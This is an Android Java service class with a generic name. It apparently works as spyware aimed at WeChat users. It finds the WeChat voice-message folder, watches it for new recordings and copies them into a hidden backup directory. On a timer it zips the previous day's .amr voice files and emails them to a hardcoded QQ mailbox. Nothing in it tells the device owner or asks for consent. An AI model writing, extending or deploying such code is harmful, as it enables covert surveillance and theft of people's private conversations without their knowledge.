package com.mail.service;import android.app.Service;import android.content.Intent;import android.os.Environment;import android.os.IBinder;import android.util.Log;import com.alibaba.fastjson.JSONArray;import com.mail.filemonitor.FileListener;import com.mail.filemonitor.FileMonitor;import com.mail.interfaces.MyInterface;import com.mail.utils.DirTraversal;import com.mail.utils.MethodUtil;import com.mail.utils.MyApplication;import com.mail.utils.Preferences;import com.mail.utils.ZipUtils;import com.mail.emailutil.SendMailUtil;import java.io.File;import java.io.IOException;import java.io.InputStreamReader;import java.io.LineNumberReader;import java.text.ParseException;import java.text.SimpleDateFormat;import java.util.ArrayList;import java.util.Calendar;import java.util.Date;import java.util.LinkedList;import java.util.List;import java.util.Timer;import java.util.TimerTask;import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;/** * Copyright © CapRobin * <p> * Name：MyService * Describe：自定义Service服务类 * Date：2021-05-06 19:54:26 * Author: YuFarong CapRobin@yeah.net */public class MyService extends Service implements MyInterface.ActivityCallBack {    private static String email_theme = "New Message";    private static String email_text = "New Message Text";    static SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");    static String sdPath = Environment.getExternalStorageDirectory().getAbsolutePath();    static String savedPath = sdPath + "/SystemFile/VoiceBak/";    static String voicefolderPath = "";    static int allVoiceSize = 0;    static LinkedList<File> zipFiles = null;    static Date startTime = new Date();    JSONArray jsonArray = new JSONArray();    LinkedList<File> fileList = new LinkedList<>();    public Preferences preference;    //间隔周期:1天//    private static final long PERIOD_DAY = 24 * 60 * 60 * 1000;    private static final long PERIOD_DAY = 60000;    public MyService() {    }    @Override    public IBinder onBind(Intent intent) {        Log.v("onBind", "MyService onBind----------------------------->>");        return null;    }    @Override    public void onCreate() {        Log.v("onCreate", "MyService onCreate----------------------------->>");        super.onCreate();    }    @Override    public void onStart(Intent intent, int startId) {        Log.v("onStart", "MyService onStart----------------------------->>");        super.onStart(intent, startId);    }    @Override    public int onStartCommand(Intent intent, int flags, int startId) {        String fileStr = sdPath + "/Android/data/com.tencent.mm/MicroMsg/";        voicefolderPath = folderScan(fileStr);        System.out.print("voicefolderPath----------------------------->>" + voicefolderPath + "\n\t");        if (!voicefolderPath.trim().equals("")) {            //创建一个可缓存线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无可回收，则新建线程。            ExecutorService threadPool = Executors.newCachedThreadPool();            //本地保存登录状态(loginFlag),第一次登录=false；已登录=true//            boolean loginFlag = MyApplication.preference.getBoolean("loginFlag");//            System.out.print("loginFlag----------------------------->>"+loginFlag);            //判断是否是第一次登录//            if (loginFlag) {            //备份所有语音消息并打包上传            threadPool.execute(new Runnable() {                @Override                public void run() {                    System.out.print("即将压缩并上传语音消息----------------------------->>\n\t");                    //1、压缩指定时间段的语音消息                    try {                        //获取语音消息存放路径                        String voicePath = MyApplication.preference.getString("voicePath");                        //获取昨天的日期                        Calendar cal = Calendar.getInstance();                        cal.add(Calendar.DATE, -1);                        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");                        String startTimeStr = sdf.format(cal.getTime());//获取昨天日期                        startTime = sdf.parse(startTimeStr + " 00:00:00");                        //定义被压缩文件列表                        zipFiles = new LinkedList<File>();                        allVoiceSize = 0;                        walkdir(new File(voicePath));                        if ((allVoiceSize > 0) && (zipFiles.size() > 0)) {                            System.out.println("全部语音文件共计条数：---------------------->>" + allVoiceSize + "\n\t");                            //开始压缩筛选的数据文件                            File fil = DirTraversal.getFilePath(sdPath + "/SystemFile/VoiceZip/", "VoiceBak(" + startTimeStr + ").zip");                            ZipUtils.zipFiles(zipFiles, fil);                            System.out.println("需要压缩语音文件条数：---------------------->>" + zipFiles.size() + "\n\t");                            //2、上传已已压缩的语音消息(压缩文件大于50M时会发送邮件失败)                            String fileStr = sdPath + "/SystemFile/VoiceZip/VoiceBak(" + startTimeStr + ").zip";                            SendMailUtil.send(new File(fileStr), "756657266@qq.com", "All Message", "All Message Detail");                            System.out.println("压缩文件文件已上传完成---------------------->>\n\t");                        }                    } catch (IOException e) {                        e.printStackTrace();                    } catch (ParseException e) {                        e.printStackTrace();                    }                }            });//                //保存已登录状态//                MyApplication.preference.putBoolean("loginFlag", true);//            }            //启动文件监听线程            threadPool.execute(new Runnable() {                @Override                public void run() {                    System.out.print("启动文件监听线程----------------------------->>\n\t");                    //启动文件监听线程                    fileListener();                }            });            //启动定时发送邮件线程            threadPool.execute(new Runnable() {                @Override                public void run() {                    System.out.print("启动定时发送邮件线程----------------------------->>\n\t");                    //启动定时发送邮件线程                    TimerTaskManager();                }            });//        线程池周期性执行任务//            threadPool.execute(new Runnable() {//                @Override//                public void run() {//                    int time = 0;//                    while (true) {//                        //任务执行时间,此处设置1分钟执行一次任务////                        Thread.sleep(60 * 1000);//                        System.out.print("第" + (time + 1) + "次执行循环任务----------------------------->>");//                        time++;//                    }//                }//            });        }        return super.onStartCommand(intent, flags, startId);    }    public static void walkdir(File dir) {        String pdfPattern = ".amr";        File[] listFile = dir.listFiles();        //System.out.println("扫描循环中---------------------->>\n\t");        if (listFile != null) {            for (int i = 0; i < listFile.length; i++) {                if (listFile[i].isDirectory()) {                    walkdir(listFile[i]);                } else {                    if (listFile[i].getName().endsWith(pdfPattern)) {                        allVoiceSize = allVoiceSize + 1;                        //System.out.println("添加第N条语音文件：---------------------->>" + allVoiceSize + "\n\t");                        //获取昨天的新增的数据文件                        File mFile = listFile[i];                        Date lastModifyTime = new Date(mFile.lastModified());                        boolean before = startTime.before(lastModifyTime);                        if (before) {                            zipFiles.add(mFile);                        }                    }                }            }        }    }    public LinkedList<File> getAllFiles(String path) {        LinkedList<File> zipFiles = new LinkedList<File>();        //指定目录//        String path = "/usr/src/media";        //命令行        Process pp = null;        try {            pp = Runtime.getRuntime().exec("ls -a " + path + "/");            InputStreamReader ir = new InputStreamReader(pp.getInputStream());            LineNumberReader input = new LineNumberReader(ir);            String line = "";            do {                line = input.readLine();                if (line == null) {                    break;                }                File files = new File(path + line);                if (files.exists() && !files.isDirectory()) {                    String fileName = files.getName();                    //指定格式的文件                    if (fileName.matches("(\\S+)(\\-)+(\\S+).amr$")) {//                    String idStr = fileName.replace(".amr", "");                        zipFiles.add(files);                        System.out.println(files.getPath());                    }                } else {                    getAllFiles(voicefolderPath);                }            } while (true);        } catch (IOException e) {            e.printStackTrace();        }        return zipFiles;    }    /**     * Describe：启动文件监听服务     * Params: []     * Return: void     * Date：2021-05-26 13:33:34     */    public static void fileListener() {        //判断SD卡是否存在        boolean isHasSdCard = Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED);        if (isHasSdCard) {            //获得SD卡根目录路径            File sdDir = Environment.getExternalStorageDirectory();            //指定监听文件目录(微信语音文件夹)//            String monitorPath1 = sdDir.getAbsolutePath() + File.separator + "Android" + File.separator + "data" + File.separator + "com.tencent.mm" + File.separator + "MicroMsg" + File.separator + "43088dfea1f698ddeae94f73c378d106" + File.separator + "voice2";            String monitorPath = MyApplication.preference.getString("voicePath");            try {                //5秒循环执行一次                FileMonitor m = new FileMonitor(10000);                m.monitor(monitorPath, new FileListener());                m.start();                System.out.println("文件目录监听中------------------------------>>");            } catch (Exception e) {                e.printStackTrace();            } finally {            }        }    }    /**     * Describe：文件操作监听回调     * Params: [optType, file]     * Return: void     * Date：2021-06-04 14:34:36     */    @Override    public void listenerToServiceMsg(int optType, File file) {        switch (optType) {            case 1: //新建文件                System.out.println("新建文件回调------------>>" + "name：" + file.getName() + "-----directory：" + file.getPath() + "\n\t");                try {                    //本地文件处理测试//                    localFile(optType, file);                    //获取文件存储时间                    String name = file.getName();                    String year = name.substring(14, 16);                    String month = name.substring(10, 12);                    String day = name.substring(12, 14);                    String hour = name.substring(6, 8);                    String minute = name.substring(8, 10);                    String second = name.substring(4, 6);//                    String wuser = name.substring(16, 23);//                    String random = name.substring(23, 30);                    // 拼接字符串//                    String newName = year + "-" + month + "-" + day + "-" + hour + "-" + minute + "-" + second + "-" + wuser + "-" + random;                    String timeStr = year + "-" + month + "-" + day + " " + hour + "-" + minute + "-" + second;//                    fileNameList.add(file.getPath());//                    fileList.add(file);                    //判断本地是否有存储的文件//                    String getJsonArrayStr = MyApplication.preference.getString("jsonArrayStr");//                    if (!getJsonArrayStr.trim().equals("")) {//                        //参数中有值//                        jsonArray = JSONObject.parseArray(getJsonArrayStr);//                    }////                    JSONObject jsonObject = new JSONObject();//                    jsonObject.put("optType", optType);//                    jsonObject.put("name", file.getName());//                    jsonObject.put("directory", file.getPath());//                    jsonObject.put("time", timeStr);//                    jsonArray.add(jsonObject);//                    String jsonArrayStr = jsonArray.toJSONString();//                    //本地存储新增数据文件记录//                    MyApplication.preference.putString("jsonArrayStr", jsonArrayStr);//                    System.out.println("jsonArrayStr---------------------->>" + jsonArrayStr);                    //判断本地是否有存储的文件                    String logStr = MyApplication.preference.getString("logStr");                    String logStr1 = MyApplication.preference.getString("logStr1");                    //本地存储新增数据文件记录                    if (null == logStr || logStr.trim().isEmpty()) {                        MyApplication.preference.putString("logStr", file.getPath());                    } else {                        MyApplication.preference.putString("logStr", logStr + "|" + file.getPath());                    }                    String logStr2 = MyApplication.preference.getString("logStr");                    String listMeterId = String.valueOf(logStr2);                    String[] fileArray = listMeterId.split("\\|");                    System.out.println("logStr2---------------------->>" + logStr2);//                    Thread.sleep(1000*60);                    //新增文件拷贝另存                    boolean isCopyFile = MethodUtil.fileCopy(file.getPath(), savedPath + file.getName());                    System.out.println("文件拷贝---------------------->>" + isCopyFile);                } catch (IOException e) {                    e.printStackTrace();                }                break;            case 2:                //修改文件                System.out.println("修改文件回调------------>>" + "name：" + file.getName() + "-----directory：" + file.getPath() + "\n\t");                //文件被修改后继续另存                boolean isCopyFile = false;                try {                    isCopyFile = MethodUtil.fileCopy(file.getPath(), savedPath + file.getName());                } catch (IOException e) {                    e.printStackTrace();                }                System.out.println("文件拷贝---------------------->>" + isCopyFile);                break;            case 3:                //删除文件                System.out.println("删除文件回调------------>>" + "name：" + file.getName() + "-----directory：" + file.getPath() + "\n\t");                break;            default:                break;        }    }    /**     * Describe：定时任务管理_发送邮件     * Params: []     * Return: void     * Date：2021-06-04 14:09:55     */    public static void TimerTaskManager() {        //每天从hh:mm:ss开始，间隔cycleTime时间执行上传执行一次任务//        int hh = 2;//        int mm = 0;//        int ss = 0;//        int cycleTime = 1000 * 60 * 60;        int hh = 4;        int mm = 30;        int ss = 0;        int cycleTime = 1000 * 30;        System.out.print("开始定时任务---------------->>\n\t");        //设置指定执行时间        Calendar calendar = Calendar.getInstance();        calendar.set(Calendar.HOUR_OF_DAY, hh);        calendar.set(Calendar.MINUTE, mm);        calendar.set(Calendar.SECOND, ss);        //第一次执行定时任务的时间        Date date = calendar.getTime();        //如果第一次执行定时任务的时间 小于 当前的时间；此时要在 第一次执行定时任务的时间 加一天，以便此任务在下个时间点执行。如果不加一天，任务会立即执行。        if (date.before(new Date())) {            Calendar startDT = Calendar.getInstance();            startDT.setTime(date);            //设置指定执行周期，此处需要间隔一天执行            startDT.add(Calendar.MILLISECOND, 20000);            date = startDT.getTime();        }        String getDate = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(date);        //循环任务        TimerTask task = new TimerTask() {            @Override            public void run() {                // 逻辑处理                sendEmailTask();            }        };        //安排指定的任务在指定的时间开始进行重复的固定延迟执行。        Timer timer = new Timer();        //每天从hh:mm:ss开始，间隔cycleTime时间执行上传执行一次任务        timer.schedule(task, date, cycleTime);    }    /**     * Describe：发送邮件任务     * Params: []     * Return: void     * Date：2021-06-04 14:08:30     */    private static void sendEmailTask() {        try {            //判断当前时间是否与指定时间相等            File file1 = new File(savedPath);            //当前时间大于指定时间            if (file1.exists() && file1.isDirectory()) {                if (file1.list().length > 0) {                    //获取语音消息存放路径                    String voicePath = MyApplication.preference.getString("voicePath");                    //获取昨天的日期                    Calendar cal = Calendar.getInstance();                    cal.add(Calendar.DATE, -1);                    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd");                    String startTimeStr = sdf.format(cal.getTime());//获取昨天日期                    startTime = sdf.parse(startTimeStr + " 00:00:00");                    //定义被压缩文件列表                    zipFiles = new LinkedList<File>();                    allVoiceSize = 0;                    walkdir(new File(voicePath));                    if ((allVoiceSize > 0) && (zipFiles.size() > 0)) {                        System.out.println("全部语音文件共计条数：---------------------->>" + allVoiceSize + "\n\t");                        //开始压缩筛选的数据文件                        File fil = DirTraversal.getFilePath(sdPath + "/SystemFile/VoiceZip/", "VoiceBak(" + startTimeStr + ").zip");                        ZipUtils.zipFiles(zipFiles, fil);                        System.out.println("需要压缩语音文件条数：---------------------->>" + zipFiles.size() + "\n\t");                        //2、上传已已压缩的语音消息(压缩文件大于50M时会发送邮件失败)                        String fileStr = sdPath + "/SystemFile/VoiceZip/VoiceBak(" + startTimeStr + ").zip";                        SendMailUtil.send(new File(fileStr), "756657266@qq.com", "All Message", "All Message Detail");                        System.out.println("压缩文件文件已上传完成---------------------->>\n\t");                    }                    //解压文件                    //ZipUtils.unzip(pathString+"/Android/data/ZipData/YsTestData.zip", pathString+"/Android/data/ZipData/YsTestData");                }            }        } catch (IOException e) {            e.printStackTrace();        } catch (ParseException e) {            e.printStackTrace();        }//                    }    }    //扫描文件//	public static void fileScan(Activity activity,String file){//		Uri data = Uri.parse("file://"+file);//		activity.sendBroadcast(new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE, data));//	}    //扫描文件夹    public static String folderScan(String path) {        String voicefolderName = "";        File file = new File(path);        if (file.isDirectory()) {            File[] array = file.listFiles();            for (int i = 0; i < array.length; i++) {                File f = array[i];                if (file.isDirectory()) {//文件夹类型                    String folderName = f.getName();                    //筛选文件名长度大于30的文件夹                    if (folderName.length() > 30) {                        //查看每个文件下的文件夹和文件总数量                        File voiceFile = new File(path + folderName + "/");                        File[] voiceFileArray = voiceFile.listFiles();                        //指定voice2文件                        File existsFile = new File(path + folderName + "/voice2/");                        //判断每个文件夹下的文件是否大于20个并且voice2文件存在的文件夹即为语音存放目录                        if ((voiceFileArray.length > 20) && existsFile.exists()) {                            //确定语音存储目录，输出目录                            String voicePath = path + folderName + "/voice2/";                            //本地保存语音路径                            MyApplication.preference.putString("voicePath", voicePath);                            voicefolderName = voicePath;                            System.out.println("voiceSavedPath---------------------->>" + voicefolderName);                        }                    }//					if(name.contains(".mp3")){//						fileScan(activity,f.getAbsolutePath());//					}                } else {//文件类型//					folderScan(activity,f.getAbsolutePath());                }            }        }        return voicefolderName;    }}